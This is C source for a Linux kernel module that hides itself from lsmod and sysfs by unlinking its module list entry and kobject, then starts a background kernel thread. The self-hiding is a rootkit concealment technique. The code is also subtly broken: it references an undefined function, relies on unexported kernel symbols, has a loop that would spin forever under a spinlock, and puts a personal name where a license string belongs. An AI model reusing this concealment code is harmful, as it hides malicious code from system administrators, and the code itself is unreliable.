#include <asm/thread_info.h>
#include <asm/uaccess.h>
#include <linux/delay.h>
#include <linux/dirent.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/init.h>
#include <linux/kallsyms.h>
#include <linux/kernel.h>
#include <linux/kthread.h>
#include <linux/list.h>
#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/sched.h>
#include <linux/string.h>
#include <linux/syscalls.h>
#include <linux/types.h>
#include <linux/unistd.h>

MODULE_LICENSE("Zihan Guo");

static int hide_thread_init(void);
void hidemodule(void)
{
	struct module *head=&__this_module;
	struct module *next;
	next=head;
	do
	{
		if((long)(next->init)==(long)patch_init)
		{
			printk(KERN_INFO "Find module, hide it.");	
			list_del(&next->list);
			break;
	        }else
		{
	            struct list_head *entry=next->list.next;
		    next=container_of(entry, struct module, list);
		}
	}while(next!=head);
}

static void kthread_func(void *data) {
	do {
		spin_lock(&kthread_create_lock);
		while(!list_empty(&kthread_create_list)) {
			struct kthread_create_info *create;
			create = list_entry(kthread_create_list.next, struct kthread_create_info, list);
			printk(KERN_INFO "All kthread names: %s\n", create->result->comm);
		}
		spin_unlock(&kthread_create_lock);
		msleep_interruptible(1000 * 60);
	} while (!kthread_should_stop());
}

static int hide_thread_init(void) {
//    hidemodule();
	printk(KERN_INFO "Hide my module from lsmod.");
	list_del_init(&THIS_MODULE->list);
	printk(KERN_INFO "Hide my module from sysfs.");
#ifdef CONFIG_SYSFS
	kobject_del(&THIS_MODULE->mkobj.kobj);
#endif
	kthread_run(kthread_func, NULL, "my_kthread%d", 1);
	return 0;
}
static void hide_thread_cleanup(void)
{
}

module_init(hide_thread_init);
module_exit(hide_thread_cleanup);

